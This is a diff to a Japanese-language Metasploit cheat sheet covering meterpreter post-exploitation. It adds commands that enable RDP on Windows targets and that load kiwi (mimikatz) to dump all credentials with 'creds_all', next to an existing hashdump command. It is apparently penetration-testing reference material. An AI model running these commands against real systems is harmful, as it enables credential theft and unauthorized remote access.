@@ -395,6 +395,9 @@ search post/linux
 
 ```shell
 meterpreter > run post/linux/gather/hashdump
+
+# RDP有効化
+meterpreter > run post/windows/manage/enable_rdp
 ```
 
 ### モジュールのロード
@@ -403,6 +406,17 @@ meterpreter > run post/linux/gather/hashdump
 meterpreter > load python
 meterpreter > load kiwi
 meterpreter > help
+```
+
+### kiwi
+
+mimikatz の進化
+
+```sh
+meterpreter > load kiwi
+meterpreter > help
+
+meterpreter > creds_all
 ```
 
 ### 永続化の例
